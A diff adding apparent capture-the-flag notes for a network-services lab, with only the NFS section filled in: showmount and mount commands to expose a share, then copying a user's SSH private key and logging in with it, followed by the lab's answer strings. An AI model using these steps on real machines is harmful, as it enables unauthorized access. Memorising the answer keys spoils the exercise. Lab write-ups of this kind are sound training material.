@@ -1,1 +1,53 @@
-Soon...
+1.Get Connected
+
+
+
+2.Understanding NFS
+
+Some explanation of the NFS(Network File System) 
+
+Answer:Network File System,Mounting,file handle,RPC,user id / group id,Y,Y,4.2
+
+3.Enumerating NFS
+
+The two showmount commands are the same the below is the short form
+/usr/sbin/showmount -e machine_ip
+showmount -e machine_ip
+
+sudo mount -t nfs machine_ip:home /home/user/Desktop/nfsfolder -nolock
+
+get into the folder and use ls -a to see the .ssh folder and copy the id_rsa then connect with ssh
+
+ssh -i id_rsa cappucino@machine_ip
+
+Answer:7,2049,/home,cappucino,.ssh,id_rsa,Y
+
+4.Exploit NFS
+
+Answer
+
+5.Understanding SMTP
+
+Answer
+
+6.Enumerating SMTP
+
+Answer
+
+7.Exploit SMTP
+
+Answer:
+
+8.Understanding MYSQL
+
+Answer:
+
+9.Enumerating MYSQL
+
+Answer:
+
+10.Exploit MYSQL
+
+Answer:
+
+11.Further Learning
